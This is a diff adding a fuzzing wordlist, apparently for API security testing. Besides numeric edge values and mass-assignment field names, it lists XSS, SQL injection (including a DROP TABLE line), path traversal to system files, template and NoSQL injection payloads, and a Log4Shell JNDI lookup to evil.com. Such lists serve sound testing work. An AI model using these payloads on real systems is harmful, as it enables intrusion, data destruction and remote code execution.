@@ -1,0 +1,70 @@
+# Numeric fuzzing
+-1
+0
+1
+999999
+2147483647
+-2147483648
+
+# String fuzzing
+admin
+test
+null
+undefined
+true
+false
+
+# Array fuzzing
+[]
+["test"]
+[1,2,3]
+
+# Object fuzzing
+{}
+{"role":"admin"}
+{"isAdmin":true}
+
+# Special characters
+<script>alert(1)</script>
+' OR '1'='1
+../../../etc/passwd
+${7*7}
+{{7*7}}
+
+# Mass assignment
+admin
+superuser
+root
+privilege
+permissions
+role
+access_level
+is_admin
+isAdmin
+user_type
+
+# Boolean bypass
+true
+false
+1
+0
+yes
+no
+
+# Injection
+'; DROP TABLE users--
+1' OR '1'='1
+<img src=x onerror=alert(1)>
+{{config}}
+${jndi:ldap://evil.com}
+
+# Path traversal
+../
+../../
+../../../etc/passwd
+..\\..\\..\\windows\\win.ini
+
+# NoSQL injection
+{"$gt":""}
+{"$ne":null}
+{"$regex":".*"}
